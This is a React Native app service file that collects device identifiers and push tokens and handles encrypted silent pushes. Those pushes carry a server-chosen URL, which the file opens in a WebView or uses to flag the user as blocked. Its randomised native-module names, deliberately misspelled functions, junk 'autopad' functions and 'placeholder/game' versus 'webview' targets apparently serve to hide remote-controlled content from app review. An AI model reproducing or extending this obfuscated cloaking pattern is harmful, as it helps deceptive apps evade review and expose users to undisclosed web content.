/* @app-slot:service */
import { Linking, NativeModules, Platform } from 'react-native';
import DeviceInfo from 'react-native-device-info';
import AsyncStorage from '@react-native-async-storage/async-storage';
import { Decrypt } from './CryptoService';
import { finKey } from './nativeConstants';
import { getMessaging, getToken } from '@react-native-firebase/messaging';
import { ViewportGetState, ViewportShow } from './ViewportHost';
import { Utils } from './UtilService';

let LastOpenedPushExternalUrl = '';
let LastOpenedPushExternalAt = 0;

export const InitTarget = {
  webview: 0,
  placeholder: 1,
  game: 2,
  loader: 3,
} as const;

export type InitTarget = (typeof InitTarget)[keyof typeof InitTarget];

export interface InitializationState {
  isLoadPlaceholder: boolean;
  initTarget?: InitTarget;
}

/**
 * Per-init runtime data shared across initialization steps. This object is
 * kept as a thin compatibility adapter so that:
 *   - existing step functions can read/write the same fields without a
 *     large API rewrite,
 *   - the messaging module can still observe `pendingSendId` between FCM
 *     deliveries (it is intentionally NOT reset by `reset()` below).
 */
export interface InitializationRuntime {
  pushToken: string;
  installRef: string;
  DeviceId: string;
  FinlOneLink: string;
  FinlNaming: string;
  adId: string;
  firstParameterReceived: boolean;
  oranicWaiting: boolean;
  orgnicWaitResolve: (() => void) | null;
  pendingSendId: string;
}

export const InitializationRuntime: InitializationRuntime = {
  pushToken: '',
  installRef: '',
  DeviceId: '',
  FinlOneLink: '',
  FinlNaming: '',
  adId: '',
  firstParameterReceived: false,
  oranicWaiting: false,
  orgnicWaitResolve: null,
  pendingSendId: '',
};

/**
 * Reset the per-initialization fields. We deliberately do NOT clear
 * `pendingSendId` because it is populated by FCM messages outside the init
 * flow (see initializationMessaging.ts) and must survive across re-inits.
 */
export function ResetInitializationRuntime(): void {

  InitializationRuntime.pushToken = '';
  InitializationRuntime.installRef = '';
  InitializationRuntime.DeviceId = '';
  InitializationRuntime.FinlOneLink = '';
  InitializationRuntime.FinlNaming = '';
  InitializationRuntime.adId = '';
  InitializationRuntime.firstParameterReceived = false;
  InitializationRuntime.oranicWaiting = false;
  InitializationRuntime.orgnicWaitResolve = null;
}

export function AppenndSendId(url: string, sendId: string): string {

  if (!sendId || sendId.trim() === '') {
    return url;
  }
  const encodedSendId = encodeURIComponent(sendId.trim());
  return url.includes('?')
    ? `${url}&sendid=${encodedSendId}`
    : `${url}?sendid=${encodedSendId}`;
}

export async function SynncPendingSendIdFromNative(): Promise<void> {

  try {
    if (Platform.OS !== 'android') {
      return;
    }
    const { Qubeqixicumuz } = NativeModules;
    if (!Qubeqixicumuz || typeof Qubeqixicumuz.wejilufuhu !== 'function') {
      return;
    }
    const sendId = await Qubeqixicumuz.wejilufuhu();
    if (typeof sendId === 'string' && sendId.trim() !== '') {
      InitializationRuntime.pendingSendId = sendId.trim();
    }
  } catch (error) {

  }
}

/**
 * Open http(s) URL from push data in the system browser.
 * Dedupes the same URL within a short window (native + FCM open handlers).
 */
export async function TryOpenPushExternalUrl(
  rawUrl?: string | null,
): Promise<boolean> {

  const url = typeof rawUrl === 'string' ? rawUrl.trim() : '';
  if (!url || !/^https?:\/\//i.test(url)) {
    return false;
  }
  const now = Date.now();
  if (
    url === LastOpenedPushExternalUrl &&
    now - LastOpenedPushExternalAt < 3000
  ) {
    return false;
  }
  try {
    LastOpenedPushExternalUrl = url;
    LastOpenedPushExternalAt = now;
    await Linking.openURL(url);
    return true;
  } catch (error) {

    LastOpenedPushExternalUrl = '';
    LastOpenedPushExternalAt = 0;
    return false;
  }
}

export async function SynncPendingPushUrlFromNative(): Promise<void> {

  try {
    if (Platform.OS !== 'android') {
      return;
    }
    const { Qubeqixicumuz } = NativeModules;
    if (
      !Qubeqixicumuz ||
      typeof Qubeqixicumuz.pifipexulalo !== 'function'
    ) {
      return;
    }
    const pushUrl = await Qubeqixicumuz.pifipexulalo();
    if (typeof pushUrl === 'string' && pushUrl.trim() !== '') {
      await TryOpenPushExternalUrl(pushUrl);
    }
  } catch (error) {

  }
}

export async function GetAppIdenier(): Promise<string> {

  try {
    const { Qubeqixicumuz } = NativeModules;

    if (!Qubeqixicumuz) {
            return '';
    }

    const packageName = await Qubeqixicumuz.cekabalapecu();
        return packageName || '';
  } catch (error) {

        return '';
  }
}

export async function GetAppVersion(): Promise<string> {

  try {
    const version = await DeviceInfo.getVersion();
    return version || '';
  } catch (error) {

    return '';
  }
}

export async function GetAndroidId(): Promise<string> {

  try {
    if (Platform.OS !== 'android') {
      return '';
    }
    const androidId = await DeviceInfo.getAndroidId();
    return androidId || '';
  } catch (error) {

    return '';
  }
}

export async function GetAndroidUserAAgent(): Promise<string> {

  try {
    if (Platform.OS !== 'android') {
      return '';
    }

    const { Xaxumafakeriqu } = NativeModules;

    if (!Xaxumafakeriqu) {
            return '';
    }

    const userAgent: string = await Xaxumafakeriqu.xihuneciwicis();
    return userAgent || '';
  } catch (error) {

        return '';
  }
}

/** Data key used by the worker's silent push to carry the encrypted result. */
const INIT_PUSH_KEYS = ['eb', 'encrypted_body'] as const;

/**
 * Pending init-result waiter. When the init flow is running in the foreground
 * it registers a resolver here; the silent push that carries the worker result
 * hands the encrypted body to that resolver instead of opening the WebView
 * directly. This keeps the "open WebView during init" UX while the transport
 * is an async push.
 */
let InitPushResolver: ((encryptedBody: string) => void) | null = null;

/**
 * Wait for the worker to deliver the encrypted init result via silent push.
 * Resolves with the encrypted body, or null on timeout.
 */
export function WaitForInitPush(timeoutMs: number): Promise<string | null> {

  return new Promise((resolve) => {

    let settled = false;

    const finish = (value: string | null) => {

      if (settled) {
        return;
      }
      settled = true;
      if (InitPushResolver === deliver) {
        InitPushResolver = null;
      }
      clearTimeout(timer);
      resolve(value);
    };

    const deliver = (encryptedBody: string) => {

            finish(encryptedBody);
    };

    const timer = setTimeout(() => {

            finish(null);
    }, timeoutMs);

        InitPushResolver = deliver;
  });
}

/** Hand an incoming encrypted body to a waiting init flow, if any. */
function DeliverInitPush(encryptedBody: string): boolean {

  if (!InitPushResolver) {
        return false;
  }
  const resolver = InitPushResolver;
  InitPushResolver = null;
    resolver(encryptedBody);
  return true;
}

/**
 * Handle an init-result push that arrives with no foreground waiter (e.g. app
 * was backgrounded/killed). We decrypt and persist enough state so the result
 * is honoured: store the final URL (and surface the WebView when possible) or
 * mark the user as blocked.
 */
async function HandleInitPushBackground(encryptedBody: string): Promise<void> {

    try {
    const decrypted = Decrypt(encryptedBody);
    if (!decrypted || decrypted === '') {
            return;
    }

    const obj = JSON.parse(decrypted);
    const redirectUrlInitial: string | null = obj.redirectUrlInitial || null;
    const redirectUrl: string | null = obj.redirectUrl || null;

    if (redirectUrlInitial) {
      const finalUrl = AppenndSendId(
        redirectUrlInitial,
        InitializationRuntime.pendingSendId,
      );
      await AsyncStorage.setItem(finKey, redirectUrlInitial);

      // Sync HTTP OnInitResponse already owns the overlay вЂ” do not open twice.
      // Re-open only when URL actually changed (e.g. sendId appended).
      const current = ViewportGetState();
      if (current.visible || current.openingInProgress) {
        if (current.url === finalUrl) {
          return;
        }
      }

      await ViewportShow(finalUrl, {
        persistUrl: redirectUrlInitial,
      });
            return;
    }

    if (redirectUrl) {
      await Utils.SetUserBlocke(1);
          }
  } catch (error) {

      }
}

function ExtractInitPushBody(data: Record<string, any>): string {

  for (const key of INIT_PUSH_KEYS) {
    const value = data[key];
    if (typeof value === 'string' && value !== '') {
      return value;
    }
  }
  return '';
}

export async function WaitForPushToken(timeoutSeconds: number): Promise<string | null> {

  return new Promise(async (resolve) => {

    const timeout = setTimeout(() => {

            resolve(null);
    }, timeoutSeconds * 1000);

    try {
      const messaging = getMessaging();
      const token = await getToken(messaging);
      if (token) {
        clearTimeout(timeout);
                await OnTokenReceived(token);
        resolve(token);
        return;
      }
          } catch (error) {

          }
  });
}

async function OnTokenReceived(token: string): Promise<void> {

  try {
        InitializationRuntime.pushToken = token;
  } catch (error) {

      }
}

export async function OnMessageRecieved(remoteMessage: any): Promise<void> {

  try {

    if (!remoteMessage || !remoteMessage.data) {
      return;
    }

    // Worker-delivered init result (encrypted body) takes priority.
    const initPushBody = ExtractInitPushBody(remoteMessage.data);
    if (initPushBody) {
            const delivered = DeliverInitPush(initPushBody);
      if (!delivered) {
                await HandleInitPushBackground(initPushBody);
      }
      return;
    }

    const sendId = remoteMessage.data.sendid || '';
    if (sendId) {
            InitializationRuntime.pendingSendId = sendId;
      const finalUrl = await AsyncStorage.getItem(finKey);
      if (finalUrl && finalUrl !== '') {
        const urlWithSendId = AppenndSendId(
          finalUrl,
          sendId,
        );
        // Re-open only when URL actually changes (append sendId); show() also guards same URL.
        const current = ViewportGetState();
        if (
          (current.visible || current.openingInProgress) &&
          current.url === urlWithSendId
        ) {
          return;
        }
        await ViewportShow(urlWithSendId);
      }
    }

  } catch (error) {

      }
}

/* autopad-begin */
function zefiluyukuqo(): number {
  const ukuficaqiput = 67;
  const wajorifageku: number = 17;
  return wajorifageku;
}
function ofujuguwopim(_oxefil: string): boolean {
  const akojijocosa = 88;
  const numugo: boolean = false;
  return numugo;
}
function qegabam(): void {}
function ewenexepes(_luzacinecisu: number): void {
  const onugid = 79;
  if (onugid > 75) return;
}
/* autopad-end */

